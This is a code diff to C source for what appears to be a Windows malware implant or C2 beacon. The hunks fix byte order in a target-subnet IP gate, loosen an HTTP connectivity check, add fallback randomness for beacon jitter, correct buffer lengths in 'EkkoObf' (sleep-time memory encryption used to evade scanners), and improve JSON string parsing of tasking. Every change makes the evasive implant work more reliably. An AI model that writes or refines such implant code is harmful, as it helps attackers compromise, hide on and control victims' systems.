@@ -128,9 +128,9 @@ END:
 }
 
 BOOL ip_whitelist_gate(VOID) {
-  ULONG start = inet_addr(WHITELIST_SUBNET_START);
-  ULONG end = inet_addr(WHITELIST_SUBNET_END);
-  ULONG ip = GetCurrentIpAddress();
+  ULONG start = ntohl(inet_addr(WHITELIST_SUBNET_START));
+  ULONG end = ntohl(inet_addr(WHITELIST_SUBNET_END));
+  ULONG ip = ntohl(GetCurrentIpAddress());
 
   if (ip >= start && ip <= end)
     return TRUE;
@@ -185,7 +185,7 @@ BOOL checking_connection(BOOL *Connection) {
                       WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize,
                       WINHTTP_NO_HEADER_INDEX);
 
-  if (statusCode == 200)
+  if (statusCode >= 200 && statusCode < 500)
     *Connection = TRUE;
 
 cleanup:
@@ -202,7 +202,9 @@ cleanup:
 
 static ULONG Random32(VOID) {
   unsigned int Seed = 0;
-  _rdrand32_step(&Seed);
+  if (!_rdrand32_step(&Seed)) {
+    Seed = GetTickCount() ^ (ULONG)(ULONG_PTR)&Seed;
+  }
   return Seed;
 }
 
@@ -261,7 +263,8 @@ static VOID EkkoObf(IN PWIN32_API pWin32Apis, IN DWORD dwTimeOut) {
   Key.Buffer = (PCHAR)Rnd;
   Key.Length = sizeof(Rnd);
   Img.Buffer = (PCHAR)ImageBase;
-  Img.Length = (USHORT)ImageSize;
+  Img.Length = (USHORT)(ImageSize > 0xFFFF ? 0xFFFF : ImageSize);
+  Img.MaximumLength = (USHORT)(ImageSize > 0xFFFF ? 0xFFFF : ImageSize);
 
   if (!NT_SUCCESS(Status = pWin32Apis->RtlCreateTimerQueue(&Queue)))
     goto LEAVE;
@@ -531,10 +534,11 @@ CLEANUP:
 
 DWORD jitter(DWORD baseMs) {
   DWORD variation = (baseMs * JITTER_PERCENT) / 100;
-  if (variation == 0)
+  if (variation == 0 || variation > baseMs)
     return baseMs;
   unsigned int rnd = 0;
-  _rdrand32_step(&rnd);
+  if (!_rdrand32_step(&rnd))
+    rnd = GetTickCount();
   return baseMs - variation + (rnd % (2 * variation));
 }
 
@@ -561,8 +565,22 @@ static BOOL json_get_string(const CHAR *json, const CHAR *key, CHAR *out,
     return FALSE;
   start++;
   DWORD i = 0;
-  while (*start && *start != '"' && i < outMax - 1)
-    out[i++] = *start++;
+  while (*start && i < outMax - 1) {
+    if (*start == '\\' && *(start + 1)) {
+      start++; // skip backslash
+      if (*start == '"') { out[i++] = '"'; }
+      else if (*start == 'n') { out[i++] = '\n'; }
+      else if (*start == 'r') { out[i++] = '\r'; }
+      else if (*start == 't') { out[i++] = '\t'; }
+      else if (*start == '\\') { out[i++] = '\\'; }
+      else { out[i++] = *start; }
+      start++;
+    } else if (*start == '"') {
+      break;
+    } else {
+      out[i++] = *start++;
+    }
+  }
   out[i] = '\0';
   return i > 0;
 }
